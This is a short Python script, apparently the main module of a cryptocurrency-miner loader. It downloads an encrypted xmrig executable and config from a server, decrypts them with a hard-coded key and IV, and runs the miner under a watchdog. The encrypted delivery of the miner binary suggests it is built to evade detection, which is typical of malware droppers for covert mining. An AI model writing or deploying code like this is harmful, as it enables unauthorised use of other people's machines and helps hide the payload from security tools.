from lib.Config import Config
from lib.Downloader import Downloader
from lib.Encryptor import Encryptor
from lib.Miner import Miner
import base64


class Main:
    def __init__(self, config:Config):
        self.config = config
        self.decoded = False


        binary_path, config_path = self.download()

        self.decrypt(binary_path, config_path)

        self.start_mining(binary_path, self.config.poll_interval)
        



    def download(self) -> tuple[str, str]:
        self.decoded = False

        downloader = Downloader(self.config.server_address, self.config.chunk_size)

        binary_path = downloader.download(self.config.binary_name)
        config_path = downloader.download(self.config.config_name)

        return binary_path, config_path


    def decrypt(self, binary_path, config_path):
        encryptor = Encryptor(
            base64.b64decode(self.config.KEY),
            base64.b64decode(self.config.IV))

        encryptor.decrypt(binary_path)
        encryptor.decrypt(config_path)

        self.decoded = True
    

    def start_mining(self, binary_path:str, poll_interval:float = 0.5):
        miner = Miner(binary_path)
        miner.watchdog(poll_interval)


if __name__ == "__main__":
    config = {
        "binary_name": "xmrig.exe",
        "config_name": "config.json",
        "server_address": "http://localhost:8080",
        "chunk_size": 1024,
        "KEY": "+EBvTljUQxtSi5vmj4tTmz5/oq2um0Vu4s8A5RowMQ8=",
        "IV": "pE6FHNLt9qxk04TT/3vqQQ=="
    }

    config_obj = Config(**config)


    Main(config_obj)
    print("Terminated.......")
